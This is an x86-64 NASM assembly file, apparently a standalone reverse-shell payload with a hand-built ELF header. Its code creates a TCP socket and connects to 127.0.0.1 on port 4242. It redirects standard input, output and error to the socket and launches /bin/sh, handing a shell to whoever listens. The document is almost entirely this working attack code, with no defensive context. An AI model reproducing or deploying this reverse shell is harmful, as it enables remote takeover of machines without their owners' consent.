; shell.s – minimal Linux x86-64 program
; Assemble with: nasm -f bin shell.s -o shell
BITS 64

org 0x400000 ; Default base address for 64-bit executables

ehdr:                         ; Elf64_Ehdr
    db 0x7F, "ELF"            ; e_ident: ELF magic
    db 2, 1, 1, 0             ; e_ident: 64 bit, little endian, version 1, target System V
    db 0, 0, 0, 0, 0, 0, 0, 0 ; e_ident: padding
    dw 2                      ; e_type
    dw 0x3E                   ; e_machine
    dd 1                      ; e_version
    dq _start                 ; e_entry
    dq phdr - $$              ; e_phoff
    dq 0                      ; e_shoff
    dd 0                      ; e_flags
    dw ehdr_size              ; e_ehsize
    dw phdr_size              ; e_phentsize
    dw 1                      ; e_phnum
    dw 0                      ; e_shentsize
    dw 0                      ; e_shnum
    dw 0                      ; e_shstrndx

ehdr_size equ $ - ehdr

phdr:            ; Elf64_Phdr
    dd 1         ; p_type
    dd 5         ; p_flags
    dq 0         ; p_offset
    dq $$        ; p_vaddr
    dq $$        ; p_paddr
    dq file_size ; p_filesz
    dq file_size ; p_memsz
    dq 0x1000    ; p_align

phdr_size equ $ - phdr

section .text
    global _start

_start:
    ;int socket(int domain, int type, int protocol);
    mov     rax, 41  ; syscall socket
    mov     rdi, 2   ; AF_INET
    mov     rsi, 1   ; SOCK_STREAM
    ; xor is faster than mov on modern cpus. magic?
    xor     rdx, rdx ; protocol 0
    syscall

    mov     r12, rax ; save sockfd

    ; socaddr_in struct
    sub rsp, 16 ; reserve 16 bytes

    ; convert port and address to hex and then reverse the bits for little endian
    mov word [rsp], 2               ; sin_family = AF_INET
    mov word [rsp + 2], 0x9210      ; sin_port = __builtin_bswap16(4242) (0x1092)
    mov dword [rsp + 4], 0x0100007F ; sin_addr = 127.0.0.1 (0x7F000001)

    xor rax, rax                    ; clear rax
    mov qword [rsp + 8], rax        ; sin_zero = 0

    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    mov rax, 42      ; syscall connect
    mov rdi, r12     ; sockfd
    mov rsi, rsp     ; sockaddr*
    mov rdx, 16      ; sizeof(sockaddr_in)
    syscall

    ; int dup2(int oldfd, int newfd);
    mov     rax, 33     ; syscall dup2
    mov     rdi, r12    ; sockfd
    xor     rsi, rsi    ; rsi = 0
    syscall             ; dup2(sockfd, 0);
    mov     rax, 33     ; syscall dup2
    mov     rdi, r12    ; sockfd
    inc     rsi         ; rsi = 1
    syscall             ; dup2(sockfd, 1);
    mov     rax, 33     ; syscall dup2
    mov     rdi, r12    ; sockfd
    inc     rsi         ; rsi = 2
    syscall             ; dup2(sockfd, 2);

    ; int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
    xor     rdx, rdx                ; envp = 0;
    mov     rbx, 0x0068732f6e69622f ; "/bin/sh\x00"
    push    rbx                     ; push to stack
    mov     rdi, rsp                ; filename = *"/bin/sh"
    push    rdx                     ; argv[1] = *0
    push    rdi                     ; argv[0] = *"/bin/sh"
    mov     rsi, rsp                ; argv = [&"/bin/sh", 0]
    mov     rax, 59                 ; execve syscall
    syscall                         ; execve ("/bin/sh", ["/bin/sh", 0], 0);

    ; [[noreturn]] void _exit(int status);
    mov     rax, 60         ; syscall: exit
    xor     rdi, rdi        ; status = 0
    syscall                 ; exit(0)

file_size equ $ - $$
